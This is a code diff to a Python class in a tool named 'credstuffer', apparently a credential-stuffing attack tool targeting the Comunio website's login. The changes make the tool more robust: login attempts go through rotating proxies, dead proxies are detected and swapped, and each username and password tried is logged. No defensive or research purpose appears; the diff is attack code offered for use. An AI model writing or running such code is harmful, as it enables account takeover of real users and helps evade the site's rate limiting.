@@ -1,7 +1,7 @@
 import logging
 import requests
 from credstuffer import UserAccount
-from credstuffer.exceptions import ProxyNotSetError, ProxyMaxRequestError
+from credstuffer.exceptions import ProxyNotSetError, ProxyMaxRequestError, ProxyBadConnectionError
 
 
 class Comunio(UserAccount):
@@ -40,14 +40,14 @@ class Comunio(UserAccount):
 
             # check if we need a new proxy
             if self.request_counter < self.max_requests:
-                try:
 
+                try:
+                    request_login = self.session.post(self.comunio_login_url, headers=self.headers, data=login_form, timeout=self.login_request_timeout, allow_redirects=False)
                     self.request_counter += 1
-                    request_login = self.session.post(self.comunio_login_url, headers=self.headers, data=login_form, timeout=self.login_request_timeout)
-                    self.logger.info("request comunio with username: {} and password: {}".format(username, password))
-                except requests.exceptions.RequestException as e:
-                    self.logger.error(e)
-                    return None
+                    self.logger.info("request comunio with username: {}, password: {}, proxy: {}".format(username, password, self.session.proxies['http']))
+                except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout) as e:
+                    #self.logger.error(e)
+                    raise ProxyBadConnectionError("Proxy Bad Connection")
             else:
                 # raise Error to renew Proxy
                 raise ProxyMaxRequestError("Max number of proxy requests reached!")
@@ -61,9 +61,12 @@ class Comunio(UserAccount):
 
         """
         if isinstance(proxy, dict):
-            self.logger.info("set proxy to {}".format(proxy['http']))
-            self.session.proxies = proxy
-
+            alive = self.is_proxy_alive(proxy=proxy)
+            if alive:
+                self.logger.info("set proxy to {}".format(proxy['http']))
+                self.session.proxies = proxy
+            else:
+                raise ProxyBadConnectionError("Renew proxy due to bad connection!")
         else:
             raise TypeError("proxy must be type of dictionary!")
 
